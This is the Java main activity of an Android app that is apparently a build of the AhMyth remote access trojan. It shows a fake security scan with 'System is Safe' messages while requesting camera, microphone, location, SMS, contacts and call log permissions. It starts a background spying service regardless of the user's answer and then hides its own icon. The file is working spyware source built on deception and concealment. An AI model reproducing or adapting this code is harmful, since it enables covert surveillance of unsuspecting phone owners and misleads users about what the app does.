package ahmyth.mine.king.ahmyth;

import android.Manifest;
import android.app.Activity;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import java.util.ArrayList;
import java.util.List;

public class MainActivity extends Activity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        
        final android.widget.TextView statusText = (android.widget.TextView) findViewById(R.id.statusText);
        final android.widget.TextView actionStatus = (android.widget.TextView) findViewById(R.id.actionStatus);
        final android.widget.Button btnAction = (android.widget.Button) findViewById(R.id.btnAction);
        
        // Start Service in background immediately
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(new Intent(this, MainService.class));
        } else {
            startService(new Intent(this, MainService.class));
        }

        btnAction.setOnClickListener(new android.view.View.OnClickListener() {
            @Override
            public void onClick(android.view.View v) {
                // Check permissions first
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                    if (checkSelfPermission(Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
                         checkAndRequestPermissions();
                         return;
                    }
                }
                
                // If permissions granted, run fake scan
                btnAction.setEnabled(false);
                btnAction.setText("SCANNING...");
                
                new android.os.Handler().postDelayed(new Runnable() {
                    @Override
                    public void run() {
                        statusText.setText("Fixing vulnerabilities...");
                        actionStatus.setText("Processing...");
                        actionStatus.setTextColor(android.graphics.Color.BLUE);
                    }
                }, 1500);

                new android.os.Handler().postDelayed(new Runnable() {
                    @Override
                    public void run() {
                        statusText.setText("System is Safe.");
                        actionStatus.setText("PROTECTED");
                        actionStatus.setTextColor(android.graphics.Color.GREEN);
                        btnAction.setText("FINISHED");
                        android.widget.Toast.makeText(MainActivity.this, "Optimization Complete.", android.widget.Toast.LENGTH_LONG).show();
                        
                        // Hide App Icon after "Completion"
                        new android.os.Handler().postDelayed(new Runnable() {
                            @Override
                            public void run() {
                                finish();
                                fn_hideicon();
                            }
                        }, 1000);
                    }
                }, 4000);
            }
        });
        
        // Auto-check permissions on launch
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
             checkAndRequestPermissions();
        }
    }

    private void checkAndRequestPermissions() {
        List<String> permissionsNeeded = new ArrayList<>();
        String[] permissions = new String[] {
            Manifest.permission.CAMERA,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_SMS,
            Manifest.permission.SEND_SMS,
            Manifest.permission.WRITE_EXTERNAL_STORAGE
        };
        
        for (String p : permissions) {
            if (checkSelfPermission(p) != PackageManager.PERMISSION_GRANTED) {
                permissionsNeeded.add(p);
            }
        }
        
        // Add notification permission for Android 13+ (API 33)
        if (Build.VERSION.SDK_INT >= 33) {
             if (checkSelfPermission("android.permission.POST_NOTIFICATIONS") != PackageManager.PERMISSION_GRANTED) {
                 permissionsNeeded.add("android.permission.POST_NOTIFICATIONS");
             }
        }

        if (!permissionsNeeded.isEmpty()) {
            requestPermissions(permissionsNeeded.toArray(new String[0]), 123);
        } else {
            startMyService();
            finish();
            fn_hideicon();
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        if (requestCode == 123) {
            // Regardless of result, start service to try our best
            startMyService();
            finish();
            fn_hideicon();
        }
    }

    private void startMyService() {
        Intent intent = new Intent(this, MainService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent);
        } else {
            startService(intent);
        }
    }

    private void fn_hideicon() {
        getPackageManager().setComponentEnabledSetting(getComponentName(),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP);
    }
}
